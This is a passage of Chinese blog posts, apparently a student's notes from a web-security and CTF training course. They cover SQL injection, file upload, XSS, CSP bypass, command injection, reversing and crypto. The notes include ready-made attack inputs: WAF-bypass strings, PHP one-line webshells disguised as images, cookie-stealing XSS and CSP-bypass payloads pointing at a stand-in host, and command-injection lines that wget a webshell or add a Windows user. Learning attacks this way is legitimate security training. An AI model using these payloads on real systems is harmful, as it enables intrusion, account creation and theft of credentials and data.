id=\"union注入\"><a href=\"#union注入\" class=\"headerlink\" title=\"union注入\"></a>union注入</h3><p>有回显<br>猜解字段数目 limit a,b<br>最方便</p>\n<h3 id=\"报错注入\"><a href=\"#报错注入\" class=\"headerlink\" title=\"报错注入\"></a>报错注入</h3><h3 id=\"boolean盲注\"><a href=\"#boolean盲注\" class=\"headerlink\" title=\"boolean盲注\"></a>boolean盲注</h3><p>写脚本<br>截取字符串 left substr mid regexp if</p>\n<h3 id=\"Timing盲注\"><a href=\"#Timing盲注\" class=\"headerlink\" title=\"Timing盲注\"></a>Timing盲注</h3><p>无回显<br>效率低</p>\n<h3 id=\"文件读写\"><a href=\"#文件读写\" class=\"headerlink\" title=\"文件读写\"></a>文件读写</h3><p>select LOADFILE(‘/etc/passwd’);之类的写shell进去也可以</p>\n<h3 id=\"waf\"><a href=\"#waf\" class=\"headerlink\" title=\"waf\"></a>waf</h3><p>双写关键字 seselectlect OorR<br>大小写<br>编码绕过（直接认识16进制）<br>变换姿势 &lt;—&gt; || &amp;&amp; 空格 select(username)from(admin) 科学计数法绕过 where username=1e1union select in,between,like access中info=dlookup()<br>特殊字符 <code>/**/</code> 内联注释 %00 % 反引号</p>\n<h3 id=\"这个啥。。写脚本\"><a href=\"#这个啥。。写脚本\" class=\"headerlink\" title=\"这个啥。。写脚本\"></a>这个啥。。写脚本</h3><p><a href=\"http://58.154.33.13:8003/?order=if((select(mid(flag,1,2))from(flag)),name,price\" target=\"_blank\" rel=\"external\">http://58.154.33.13:8003/?order=if((select(mid(flag,1,2))from(flag)),name,price</a>)<br>‘a’ 11000110<br>$b  0000001 &amp; 1一位一位向前移<br>$c  0000000 根据这个是不是1回显判断原来的</p>\n<h3 id=\"杂技\"><a href=\"#杂技\" class=\"headerlink\" title=\"杂技\"></a>杂技</h3><p>二次注入<br>宽字节注入 id=狷’<br>access偏移注入<br>万能密码（永真（字符串=0））<br>Mongodb注入 <code>[$ne] [$regex]</code><br>隐蔽的注入 字符串被mysql当成8字节double类型处理-》将查询内容转成数字进行运算<br>mysql过长截断 admin加空格插入后变成admin</p>\n<h2 id=\"0x05-文件\"><a href=\"#0x05-文件\" class=\"headerlink\" title=\"0x05 文件\"></a>0x05 文件</h2><h3 id=\"LFI\"><a href=\"#LFI\" class=\"headerlink\" title=\"LFI\"></a>LFI</h3><p>读敏感文件<br>临时文件<br>多线程条件竞争脚本<br>截断</p>\n<h3 id=\"RFI\"><a href=\"#RFI\" class=\"headerlink\" title=\"RFI\"></a>RFI</h3><p>远程代码执行<br>伪协议 file=’php://input’可直接post数据 php://filter读源码 phar,zip解压包含一句话木马</p>\n<h3 id=\"文件上传\"><a href=\"#文件上传\" class=\"headerlink\" title=\"文件上传\"></a>文件上传</h3><p>js校验 检查扩展名(白(配合文件包含漏洞 0x00截断 NTFS ADS特性 解析漏洞)/黑名单) MIME 随机文件名(随机值拼接到名字里) 隐藏路径(头像之类的就不行) 重写内容 检查内容</p>\n<h2 id=\"0x06-XSS\"><a href=\"#0x06-XSS\" class=\"headerlink\" title=\"0x06 XSS\"></a>0x06 XSS</h2><p>打cookie<br>盲打后台（看referer）（打出dom…）<br>窃取用户信息<br>XSS Worm<br>XSS 后门<br>第一步：弹框<br>获取cookie：document.cookie(键值对)<br>cookie选项：</p>\n<ul>\n<li>expires失效日期默认session（1.1后max-age） </li>\n<li>domain域名 path路径 默认当前的 重要<br>（跨域xhr请求时(AJAX请求时间之类的)默认不加cookie）<br>（domain可以是父域，但不能是.com）</li>\n<li>secure安全情况下传输（只看协议，可用HTTPS的XSS平台） </li>\n<li>HttpOnly 默认不带 带的话没法用js查看或修改<br>（phpinfo页面可获取cookie）</li>\n</ul>\n<p>每设一条cookie就要set-cookie一次<br>可用document.cookie=。。。在前端console直接设置<br>修改：path/domain要和原来一样<br>删除：把expires设成过去的（path/domain要和原来一样）<br>编码：escape<br>浏览器解析方式<br>token 分出来的词/标签的部分 有限状态机<br>html五种元素 空元素<code>&lt;br&gt;</code> 原始文本元素<code>&lt;sript&gt;&lt;style&gt;</code> RCDATA元素<code>&lt;title&gt;&lt;textarea&gt;</code> 外部元素（MathML或SVG命名空间元素） 基本元素<br>RCDATA:在里面无论写啥都不会被解析，要先闭合标签<br>反射型 URL中 需要用户点链接 浏览器XSS Filter（chrome比较强） 输入-输出<br>存储型 数据库里 用户打开网页就可以 输入-进入数据库-取出数据库-输出<br>步骤：</p>\n<ul>\n<li>修改参数，提交后看源代码，寻找输出位置</li>\n<li>看代码情况判断是否要/如何闭合（选择框里可用BP改，注意每一个post参数，多尝试隐藏参数）要使语法正确</li>\n<li>转义尖括号：(双引号闭合)在标签内构造属性如onmouseover</li>\n<li>构造JavaScript伪协议JavaScript:alert(document.domain)(a herf=””中)（资源型属性中）</li>\n<li>过滤domain:编码成实体<code>&amp;#100;&amp;#111;&amp;#109;&amp;#97;&amp;#105;&amp;#110</code>或&amp;#x十六进制（&amp;#后数字前加几个0都可以）</li>\n<li>把script/on/style/大小写过滤：<code>&lt;iframe src=&quot;data:text/html;base64,.......&quot;&gt;&lt;/iframe&gt;</code>(创建子窗口在父窗口弹窗)</li>\n<li>（js字符串中）编码 \\x十六进制 unicode \\八进制</li>\n<li>放到了行注释里 %0a换行</li>\n<li>两个输入拼接 第一个末尾用\\转义双引号 第二个后面可用//注释 <code>...=&quot;...&quot;+&quot;&amp;ss=aaa\\&quot;+&quot;&amp;from==1;function/**/from(){}//&quot;</code>（js函数可先调用后申明） (sql注入也可以)</li>\n<li>宽字节 “被转义\\” 前面加高字节如%0c 或再加\\转义\\</li>\n<li>js支持多行字符串 末尾加\\ gb2312时加%c0吃掉转义符</li>\n<li>无回显 eval(“”)会返回计算string得到的值 （json解析时经常用到,返回对象（要加圆括号将json转成语句）） 最后加\\在console看error找到关键代码 ?key;alert(1);//=aaa</li>\n<li>chrome会对”/&gt;/&lt;进行URL转换</li>\n<li>setTimeout函数 ‘被转义 用js编码 阻止跳转：用字符串.replace替换成自己的外部js攻击</li>\n<li>无法闭合” 可以直接闭合<code>&lt;/script&gt;</code></li>\n<li>iframe inload src=javascript:/data: srcdoc</li>\n<li>自带htmlencode的标签…</li>\n</ul>\n<p>例题<br><code>&quot;^alert(1)^&quot;</code>(在if里会先执行)<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">if(&quot;&quot;^alert(1)^&quot;&quot;!=&quot;null&quot;)&#123;</div><div class=\"line\">   document.getElementById(&apos;test&apos;).innerHTML=&quot;&quot;^alert(1)^&quot;&quot;;</div><div class=\"line\">    &#125;</div></pre></td></tr></table></figure></p>\n<p><code>*///1&quot;!=&quot;null&quot;){alert(1);/*</code>（多行注释和单行注释配合使用）<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">if(&quot;*///1&quot;!=&quot;null&quot;)&#123;alert(1);/*&quot;!=&quot;null&quot;)&#123;</div><div class=\"line\">   document.getElementById(&apos;test&apos;).innerHTML=&quot;*///1&quot;!=&quot;null&quot;)&#123;alert(1);/*&quot;;</div><div class=\"line\">    &#125;</div></pre></td></tr></table></figure></p>\n<h2 id=\"CSRF-1\"><a href=\"#CSRF-1\" class=\"headerlink\" title=\"CSRF\"></a>CSRF</h2><p>登录a生成cookie-&gt;不登出a时访问危险网站b<br>上传文件 BP会自动生成CSRF Poc</p>\n<h2 id=\"域、同源策略、CORS、JSONP\"><a href=\"#域、同源策略、CORS、JSONP\" class=\"headerlink\" title=\"域、同源策略、CORS、JSONP\"></a>域、同源策略、CORS、JSONP</h2><p>同源：协议、域名、端口（默认80）相同<br>非同源：cookie/LocalStorage/IndexDB无法读取 DOM无法获得 AJAX请求不能发送<br>二级域名相同（父子、兄弟域）允许通过设置document.domain共享cookie<br>跨域请求 JSONP WebSoket CORS<br>JSONP注入 通过添加一个<code>&lt;script&gt;</code>元素，通过src属性向服务器请求json数据，服务器将数据放在一个指定名字的回调函数返回 foo({“ip”:”8.8.8.8”}) 不造是啥但能执行 callback/jsonp/…=.（函数名）..的API<br>防御：校验referer（但可从HTTPS向http发请求或在src中用data:base64）<br>callback=alert(1);//有反射型注入<br>CORS 允许浏览器向不同源服务器发出任何请求<br>简单请求 head/get/post<br>加origin头 如果可以会回acess-control-allow-origin等<br>双方withCredentials:true且acess-control-allow-origin不为*才能接受cookie<br>预检请求<br>//0ctf xss</p>\n<h2 id=\"CSP\"><a href=\"#CSP\" class=\"headerlink\" title=\"CSP\"></a>CSP</h2><p>配置 header头 Content-Security-Policy:defalt-src ‘self’;…<br>指令<br>html5有预加载<br>bypass:<br>firefox <code>&lt;link rel=&quot;dns-fetch&quot; herf=&quot;[cookie].xss.com&quot;&gt;</code><br>chrome <code>&lt;link rel=&quot;prefetch&quot; herf=&quot;xss平台&quot;&gt;</code><br>window.location=”地址”<br>jsonp绕过<br>反射或符号执行<br>重定向绕过</p>\n<p><br></p>\n","categories":["Blog"],"tags":["搅屎棍之路"]},{"title":"安恒笔记（稍微整理版）","url":"http://ringfall.me/2017/07/23/ah/","content":"<p>无修版在这儿<br><a href=\"./20170723.txt\">web1</a><br><a href=\"./20170724.txt\">web2</a></p>\n<h2 id=\"选拔\"><a href=\"#选拔\" class=\"headerlink\" title=\"选拔\"></a>选拔</h2><p>神它喵的题目。。神它喵最高分。。神它喵队长。。<br>附上<a href=\"./anheng.docx\">野鸡题目和窝各种姿势百度的答案</a></p>\n<h2 id=\"day1\"><a href=\"#day1\" class=\"headerlink\" title=\"day1\"></a>day1</h2><h3 id=\"法律\"><a href=\"#法律\" class=\"headerlink\" title=\"法律\"></a>法律</h3><p>balabalabala…<br>总而言之就是要有法律意识2333一不小心就进去了</p>\n<h3 id=\"社工\"><a href=\"#社工\" class=\"headerlink\" title=\"社工\"></a>社工</h3><p>论如何通过各种渠道勾搭妹子或者悄咪咪视奸她的各种动态/滑稽</p>\n<h2 id=\"day2-web\"><a href=\"#day2-web\" class=\"headerlink\" title=\"day2 web\"></a>day2 web</h2><h3 id=\"书\"><a href=\"#书\" class=\"headerlink\" title=\"书\"></a>书</h3><p>cookbook系列<br>精通脚本黑客<br>web深度解剖<br>乌云的漏洞库 8w<br>端口对应表（对每个端口的漏洞进行测试挖掘）</p>\n<h3 id=\"网页流程\"><a href=\"#网页流程\" class=\"headerlink\" title=\"网页流程\"></a>网页流程</h3><p>个人-网络-cdn-对方服务器（安全狗WAF-中间件-mysql）-网页打印<br><br>waf<br>1.木马免杀 <br> 2.个人到网络时把流量转发到本地 base64_encode(),转发到网络 中转尝试突破防护</p>\n<h3 id=\"测试\"><a href=\"#测试\" class=\"headerlink\" title=\"测试\"></a>测试</h3><p>黑盒/白盒/灰盒测试</p>\n<h3 id=\"渗透流程\"><a href=\"#渗透流程\" class=\"headerlink\" title=\"渗透流程\"></a>渗透流程</h3><h4 id=\"1-信息收集：\"><a href=\"#1-信息收集：\" class=\"headerlink\" title=\"1.信息收集：\"></a>1.信息收集：</h4><p>域名、二级域名、社工、旁站、C段<br>社工<br>google hacking(bing&gt;baidu)  <br>社工库 <br> 网站信息（支付宝、朋友网、淘宝个人空间）</p>\n<h4 id=\"2-尝试漏洞-进入内网\"><a href=\"#2-尝试漏洞-进入内网\" class=\"headerlink\" title=\"2.尝试漏洞(进入内网)\"></a>2.尝试漏洞(进入内网)</h4><p>端口的未授权访问（redis/memcache）</p>\n<h4 id=\"3-可能的问题：漏洞没打补丁\"><a href=\"#3-可能的问题：漏洞没打补丁\" class=\"headerlink\" title=\"3.可能的问题：漏洞没打补丁\"></a>3.可能的问题：漏洞没打补丁</h4><p>域</p>\n<h3 id=\"弱口令\"><a href=\"#弱口令\" class=\"headerlink\" title=\"弱口令\"></a>弱口令</h3><p>连续性<br>判断是否登录成功</p>\n<h4 id=\"暴力破解-burp演示\"><a href=\"#暴力破解-burp演示\" class=\"headerlink\" title=\"暴力破解(burp演示)\"></a>暴力破解(burp演示)</h4><p>sinper 单变量 单字典<br>battering ram 多变量 单字典<br>pitchfork 多变量 多字典 字典一一对应<br>cluster bomb 单变量 多字典 循环爆破 一对多<br>(注意打开302跳转)<br>(burp-response乱码:user options-display-font)<br></p>\n<h4 id=\"工具\"><a href=\"#工具\" class=\"headerlink\" title=\"工具\"></a>工具</h4><p>hydra<br>arpr<br>3389<br>pkav http fuzzer</p>\n<h4 id=\"测试一发\"><a href=\"#测试一发\" class=\"headerlink\" title=\"测试一发~\"></a>测试一发~</h4><p><a href=\"http://192.168.50.60/dvwa\" target=\"_blank\" rel=\"external\">http://192.168.50.60/dvwa</a><br>admin password</p>\n<h3 id=\"SQL注入（针对每一种数据）\"><a href=\"#SQL注入（针对每一种数据）\" class=\"headerlink\" title=\"SQL注入（针对每一种数据）\"></a>SQL注入（针对每一种数据）</h3><p>执行操作 读写操作 增删改查<br>编程语言接受参数<br>单引号-xor异或<br>防护软件基于黑名单验证<br>select * from user where id=1 xor ‘a’=’a’<br>浏览器处理特殊字符时转URL编码<br>整形/字符串注入<br>注释符<br>内联注入 1’ and ‘1’=’1<br>终止注入 1’ and 1=1#<br>畸形解析 id=(((([(变量)]))))<br>MSSQL 执行权限 cmdshell<br>MySQL 执行权限 默认不存在执行权限<br>数据库-表-字段-值<br>具体流程：<br>union查询<br>偏移注入<br>二次注入<br>宽字节注入<br>伪静态注入<br>报错注入<br>盲注<br>布尔注入<br>时间注入</p>\n<h4 id=\"工具-1\"><a href=\"#工具-1\" class=\"headerlink\" title=\"工具\"></a>工具</h4><p>havij<br>sqlmap 可用python自定义编辑bypass脚本</p>\n<h4 id=\"acess\"><a href=\"#acess\" class=\"headerlink\" title=\"acess\"></a>acess</h4><p>sqlmap -u url –tables<br>sqlmap -u url -T “表名” –cloumns<br>sqlmap -u url -T “表名” -C “列名” –dump</p>\n<h4 id=\"mysql\"><a href=\"#mysql\" class=\"headerlink\" title=\"mysql\"></a>mysql</h4><p>sqlmap -u url –dbs<br>sqlmap -u url –tables -D “数据库”<br>sqlmap -u url -T “表名” -D “数据库” –cloums<br>sqlmap -u url -T “表名” -C “列名” -D “数据库” –dump<br>id=(((([(变量)]))))时 sqlmap -u url –dbs –prefix=”)]))))”<br>–threads=10 线程<br>–dbms=DBMS<br>有乱码或空内容<br>–no-cast<br>–hex<br>–charset=GBK<br>增加大量payload<br>–risk=RISK (1-3,default 1)<br>–level=LEVEL (1-5,default 1)<br>–level 1 默认检测 get post<br>–level 1 默认检测 get post cookie<br>–level 5 检测所有http头信息<br>–string=STRING<br>–code=CODE<br>–technique=TECH SQL injection techniques to use (default “BEUSTQ”)<br>–tamper 使用插件<br>–flush 清空缓存<br>post 表单提交<br>-r<br>–data<br>–forms</p>\n<h3 id=\"上传漏洞\"><a href=\"#上传漏洞\" class=\"headerlink\" title=\"上传漏洞\"></a>上传漏洞</h3><h4 id=\"js验证\"><a href=\"#js验证\" class=\"headerlink\" title=\"js验证\"></a>js验证</h4><p>目测：网页不用加载流量<br>删去onsubmit事件<br>进about:config把javascript.enabled改成false<br>禁用javascript<br>先改后缀再用burp改回去</p>\n<h4 id=\"MIME验证\"><a href=\"#MIME验证\" class=\"headerlink\" title=\"MIME验证\"></a>MIME验证</h4><p>content-type:image/jpeg<br>image/gif<br>image/png<br>image/jpeg<br>image/bmp</p>\n<h4 id=\"内容验证\"><a href=\"#内容验证\" class=\"headerlink\" title=\"内容验证\"></a>内容验证</h4><p>copy把php放在jpg后（前加个空格）<br>copy mmm.png/b+mm.php mm2.png<br>把php加进jpg属性中写在版权或啥里</p>\n<h4 id=\"服务端扩展名-后缀名-验证\"><a href=\"#服务端扩展名-后缀名-验证\" class=\"headerlink\" title=\"服务端扩展名(后缀名)验证\"></a>服务端扩展名(后缀名)验证</h4><h5 id=\"操作系统-window\"><a href=\"#操作系统-window\" class=\"headerlink\" title=\"操作系统 window\"></a>操作系统 window</h5><p>php.<br>php空格<br>php::$data<br>文件流特性<br>大小写</p>\n<h5 id=\"中间件\"><a href=\"#中间件\" class=\"headerlink\" title=\"中间件\"></a>中间件</h5><h6 id=\"IIS-6\"><a href=\"#IIS-6\" class=\"headerlink\" title=\"IIS 6\"></a>IIS 6</h6><p>1.asp、cer、cdx、asa都被解析为asp文件<br>2.目录为1.asp则其他所有文件都解析为asp文件<br>3.1.asp;1.jpg 1.asp;.jpg上传成功内容为空<br>4.1.asp%001.jpg</p>\n<h6 id=\"IIS-7\"><a href=\"#IIS-7\" class=\"headerlink\" title=\"IIS 7\"></a>IIS 7</h6><p>fast-cgi漏洞<br>上传图片马 1.jpg =&gt; 1.jpg/xxx.php</p>\n<h6 id=\"nginx\"><a href=\"#nginx\" class=\"headerlink\" title=\"nginx\"></a>nginx</h6><p>上传图片马 1.jpg =&gt; 1.jpg%00xxx.php<br>上传图片马 1.jpg =&gt; 1.jpg/xxx.php</p>\n<h6 id=\"light\"><a href=\"#light\" class=\"headerlink\" title=\"light\"></a>light</h6><p>fast-cgi漏洞<br>上传图片马 1.jpg =&gt; 1.jpg/xxx.php</p>\n<h6 id=\"apache\"><a href=\"#apache\" class=\"headerlink\" title=\"apache\"></a>apache</h6><p>从右向左解析，如果最后的无法解析，则解析前一个<br>php3 php4 phpml php5 pht 基于debian/ubuntu的apt-get安装lamp</p>\n<h4 id=\"代码层\"><a href=\"#代码层\" class=\"headerlink\" title=\"代码层\"></a>代码层</h4><p>&lt;?php…..?&gt;判断文件头&lt;?php<br>（看php.ini）<br>&lt;?php … ?&gt; 默认的php代码风格<br>&lt;?…..?&gt; short_open_tag=on php短标签风格<br>&lt;%…..%&gt; asp_tags=off asp风格<br><code>&lt;script language=&quot;php&quot;&gt;.....&lt;/script&gt;</code> 脚本风格<br>GIF89a &lt;?php eval($_POST[‘a’])?&gt; 1.jpg<br>GIF89a &lt;? eval($_POST[‘a’])?&gt; 2.jpg<br>GIF89a &lt;% eval($_POST[‘a’])%&gt; 3.jpg<br>GIF89a <code>&lt;script language=&quot;php&quot;&gt; eval($_POST[&#39;a&#39;]);&lt;/script&gt;</code>  4.jpg<br>GIF89a &lt;% execute(request(1))%&gt; 5.jpg</p>\n<h4 id=\"特殊上传漏洞\"><a href=\"#特殊上传漏洞\" class=\"headerlink\" title=\"特殊上传漏洞\"></a>特殊上传漏洞</h4><h5 id=\"目录验证上传\"><a href=\"#目录验证上传\" class=\"headerlink\" title=\"目录验证上传\"></a>目录验证上传</h5><p>在A/b/c/是上传保存文件目录，存在一个脚本，判断c目录下是否存在php后缀的文件，如果存在，则删除。存在一个定义路径的变量和上传文件的变量<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">Content-Disposition: form-data; name=&quot;path&quot;</div><div class=\"line\"></div><div class=\"line\">../images</div><div class=\"line\">-----------------------------190023260920007</div><div class=\"line\">Content-Disposition: form-data; name=&quot;upfile&quot;; filename=&quot;1.php&quot;</div><div class=\"line\">Content-Type: application/octet-stream</div><div class=\"line\"></div><div class=\"line\">&lt;?php</div><div class=\"line\">phpinfo();</div></pre></td></tr></table></figure></p>\n<p>修改path，导致上传路径变到b目录下，不存在检测，则绕过验证</p>\n<h5 id=\"双文件上传\"><a href=\"#双文件上传\" class=\"headerlink\" title=\"双文件上传\"></a>双文件上传</h5><p>在c是上传保存文件目录，代码存在bug，可以一次上传多个文件，但是检测的时候只检测第一个上传的文件，导致了使用双文件上传直接突破</p>\n<h4 id=\"编辑漏洞-ewebedit-fck\"><a href=\"#编辑漏洞-ewebedit-fck\" class=\"headerlink\" title=\"编辑漏洞(ewebedit fck)\"></a>编辑漏洞(ewebedit fck)</h4><h3 id=\"文件包含\"><a href=\"#文件包含\" class=\"headerlink\" title=\"文件包含\"></a>文件包含</h3><h4 id=\"本地\"><a href=\"#本地\" class=\"headerlink\" title=\"本地\"></a>本地</h4><p>include $_GET[“file”].”tpl”;<br>1.%00截断 include.php?file=2.txt%00<br>2.window下文件名最大长度259，unix为4099。后面用…..填充可忽略<br>include “test/“.$<em>GET[‘file’];<br>加../2.txt就好~<br>include “test</em>“.$_GET[‘file’];<br>加/../2.txt就好~</p>\n<h4 id=\"IIS-短标签\"><a href=\"#IIS-短标签\" class=\"headerlink\" title=\"IIS 短标签\"></a>IIS 短标签</h4><p>&lt; === . 一个任意字符<br>&lt;&lt; === .* 多个任意字符<br>dchnjrhaufgfipHHAWKRGIORHA.txt === d&lt;&lt;<br>如果首个字母相同，比较第二位的ascii，读取小的，以此类推</p>\n<h4 id=\"远程文件包含\"><a href=\"#远程文件包含\" class=\"headerlink\" title=\"远程文件包含\"></a>远程文件包含</h4><p>allow_url_include=off（http or ftp or https）<br>file=php://input就可</p>\n<h4 id=\"伪协议\"><a href=\"#伪协议\" class=\"headerlink\" title=\"伪协议\"></a>伪协议</h4><p>?file=php://filter/convert.base64-encode/resource=xxx.php</p>\n<h2 id=\"day3-web\"><a href=\"#day3-web\" class=\"headerlink\" title=\"day3 web\"></a>day3 web</h2><h3 id=\"XSS\"><a href=\"#XSS\" class=\"headerlink\" title=\"XSS\"></a>XSS</h3><p>反射型<br>存储型<br>标签<br><code>&lt;script&gt;alert()&lt;/script&gt;</code><br><code>&lt;body onload=alert()&gt;</code><br><code>&lt;input name=&quot;user&quot; value=&quot;变量&quot;&gt;</code><br>内联<br><code>&lt;input name=&quot;user&quot; value=&quot;1&quot; onmouseover=&quot;alert()&quot;&gt;</code><br>1” onmouseover=”alert()<br>终止<br><code>&lt;input name=&quot;user&quot; value=&quot;1&quot; onmouseover=alert()//&quot;&gt;</code><br>1” onmouseover=alert()//<br>html<br><code>&lt;input name=&quot;user&quot; value=&quot;&quot;&gt;&lt;svg/onload=alert()&gt;&quot;&gt;</code><br><code>&quot;&gt;&lt;svg/onload=alert()&gt;</code><br>xss平台 窃取访问插入处页面用户的cookie<br>工具 beef</p>\n<h3 id=\"目录遍历\"><a href=\"#目录遍历\" class=\"headerlink\" title=\"目录遍历\"></a>目录遍历</h3><p>IIS关闭目录浏览<br>Apache中改options</p>\n<h3 id=\"任意文件下载\"><a href=\"#任意文件下载\" class=\"headerlink\" title=\"任意文件下载\"></a>任意文件下载</h3><p>xxx.php?n=../index.php<br>模糊测试：<br>../index.php<br><code>&lt;script&gt;alert()&lt;/script&gt;</code><br>…</p>\n<h3 id=\"任意文件删除\"><a href=\"#任意文件删除\" class=\"headerlink\" title=\"任意文件删除\"></a>任意文件删除</h3><h3 id=\"防护\"><a href=\"#防护\" class=\"headerlink\" title=\"防护\"></a>防护</h3><p>包含文件硬编码<br>过滤../<br>安装第三方安全软件</p>\n<h3 id=\"命令执行\"><a href=\"#命令执行\" class=\"headerlink\" title=\"命令执行\"></a>命令执行</h3><p>ping 变量<br>ping 127.0.0.1 | echo “aa”<br>ping 127.0.0.1 | net user c4 c4 /ad<br>ping 127.0.0.1 &amp; net user<br>ping 127.0.0.1 &amp;&amp; net user</p>\n<h4 id=\"绕过手法\"><a href=\"#绕过手法\" class=\"headerlink\" title=\"绕过手法\"></a>绕过手法</h4><p>管道符：window:| &amp; &amp;&amp; unix:| &amp; &amp;&amp; ;<br>中间件是system/root 服务器提权<br>ping 变量 | net user c4 c4 /ad<br>中间件是user web提权(webshell)<br>ping 变量 | echo “&lt;?php eval($_POST[1])?&gt;” 1.php<br>ping 变量 | wget <a href=\"http://xxx.com/1.php\" target=\"_blank\" rel=\"external\">http://xxx.com/1.php</a> 远程下载 wget curl<br>window：<br>ping 变量 | dir 列目录<br>ping 变量 | type conn.php 读取数据库配置文件<br>linux：<br>ping 变量 | ls 列目录<br>ping 变量 | cat conn.php 读取数据库配置文件<br>注释<br>空格的替换 关注 09 0A 0C 0D A0 20 (16进制)<br><code>/*!...*/</code></p>\n<h4 id=\"防护-1\"><a href=\"#防护-1\" class=\"headerlink\" title=\"防护\"></a>防护</h4><p>尽量不使用外部调用<br>过滤管道符</p>\n<h3 id=\"越权-逻辑漏洞\"><a href=\"#越权-逻辑漏洞\" class=\"headerlink\" title=\"越权 逻辑漏洞\"></a>越权 逻辑漏洞</h3><p>平行越权 权限类型不变，id改变<br>垂直越权 id不变，权限类型改变<br>交叉越权 </p>\n<p>web_end…<br>虽然差不多都是已经了解了的基础但是了解的更深♂入、更系统惹~<br>感觉这个有着女声的老师讲的挺好其实:D</p>\n<h2 id=\"day3-re\"><a href=\"#day3-re\" class=\"headerlink\" title=\"day3 re\"></a>day3 re</h2><h3 id=\"书-1\"><a href=\"#书-1\" class=\"headerlink\" title=\"书\"></a>书</h3><p>黑客反汇编揭秘<br>逆向工程核心原理</p>\n<h3 id=\"数据存储顺序\"><a href=\"#数据存储顺序\" class=\"headerlink\" title=\"数据存储顺序\"></a>数据存储顺序</h3><p>大端模式（高位字节存入低地址，低位字节存入高地址）<br>小端模式（低位字节存入低地址，高位字节存入高地址）Intel x86</p>\n<h3 id=\"存储格式\"><a href=\"#存储格式\" class=\"headerlink\" title=\"存储格式\"></a>存储格式</h3><p>ASCII与UNICODE<br>Unicode是ASCII字符编码的一种扩展</p>\n<h3 id=\"windows基本架构\"><a href=\"#windows基本架构\" class=\"headerlink\" title=\"windows基本架构\"></a>windows基本架构</h3><p>用户态Ring3/核心态Ring0</p>\n<h3 id=\"PE文件结构\"><a href=\"#PE文件结构\" class=\"headerlink\" title=\"PE文件结构\"></a>PE文件结构</h3><p>注意4D 5A DOS部分-PE文件头-节表-节数据</p>\n<h3 id=\"工具-2\"><a href=\"#工具-2\" class=\"headerlink\" title=\"工具\"></a>工具</h3><p>调试工具<br>OD1.1(32)&amp;OD2.0(64)&amp;插件&amp;脚本<br>反汇编工具<br>IDA<br>其他<br>Peid 查壳<br>LoadPE dump内存镜像<br>importREC IAT修复<br>VM及镜像</p>\n<p>然，，然后就实战啦？一脸萌比。。<br>ida快捷键<br>p 把选中的部分生成函数<br>x 然后双击<br>去除花指令<br>u 把乱七八糟的undefine掉<br>c 按住的地址就可以没了貌似。。。<br>Linux edb gdb</p>\n<h2 id=\"day4-pwn\"><a href=\"#day4-pwn\" class=\"headerlink\" title=\"day4 pwn\"></a>day4 pwn</h2><p>linux基本操作<br>x86汇编<br>python<br>ida+gdb<br>pwntools<br>pwndbg<br>栈溢出</p>\n<h3 id=\"书-2\"><a href=\"#书-2\" class=\"headerlink\" title=\"书\"></a>书</h3><p>0day安全：软件漏洞分析技术》基本是windows平台，基础全面技术也相对新颖<br>《漏洞战争软件漏洞分析精要》真实漏洞分析，各种技巧<br>《Exploit 编写系列教程》<a href=\"http://bbs.pediy.com/thread-123602.html\" target=\"_blank\" rel=\"external\">http://bbs.pediy.com/thread-123602.html</a> 具体的编写流程，其中一些极限shellcode编写</p>\n<p>end…<br>懵了一天半。。。会了最傻的逆向</p>\n<h2 id=\"day5-crypto\"><a href=\"#day5-crypto\" class=\"headerlink\" title=\"day5 crypto\"></a>day5 crypto</h2><p>哈希（HASH）<br>md5 识别：16进制<br>sha1 40位<br>HASH——Windows口令 Wce.exe -l –&gt; 破解 Cain<br>Base64 加密图片<br>XXencode编码 +-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz<br>UUencode编码<br>URL编码<br>Html语言<br>Ascii<br>shellcode编码 \\x54\\x68\\x65\\x64\\x6f\\x67<br>Quoted-printable编码 =开头<br>摩尔斯电码<br>JSfuck<br>jother Javascript的匿名函数<br>ppencode 把命令写到前面存为.sh在linux运行<br>brainfuck<br>敲击码/键盘码<br>Unicode编码 &amp;#x [Hex] &amp;# [Decimal] \\U [Hex] \\U+ [Hex]<br>置换密码<br>栅栏密码 注意中文拼音的捆绑<br>代换密码 恺撒密码 Vigenere密码 Vernam密码 Playfair密码 Hill密码<br>培根密码 <a href=\"http://rumkin.com/tools/cipher/baconian.php\" target=\"_blank\" rel=\"external\">http://rumkin.com/tools/cipher/baconian.php</a><br>四方密码<br>猪圈密码<br>词频分析 <a href=\"http://www.quipqiup.com/index.php\" target=\"_blank\" rel=\"external\">http://www.quipqiup.com/index.php</a><br>流密码<br>重用密钥攻击•使用初始向量 token<br>比特反转攻击•使用消息认证码<br>分组密码<br>DES <a href=\"http://e-file.arkoo.com/tools/des3.htm\" target=\"_blank\" rel=\"external\">http://e-file.arkoo.com/tools/des3.htm</a><br>万能哒py脚本<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">import base64</div><div class=\"line\">from Crypto.Cipher import DES</div><div class=\"line\">obj = DES.new(&apos;12345678&apos;,DES.MODE_ECB)</div><div class=\"line\">ciph=&quot;vQetoiCJ/7uG24mZlOXyhESJwCNfn+Ts&quot; #老师嗦这个有+和/的肯定是base64...虽然直接解貌似是乱码？</div><div class=\"line\">ciph=base64.b64decode(ciph)</div><div class=\"line\">ciph=obj.decrypt(ciph)</div><div class=\"line\">print ciph</div></pre></td></tr></table></figure></p>\n<p>导入库有问题的话，为什么不问问神奇的虚拟机呐~<br>公钥密码 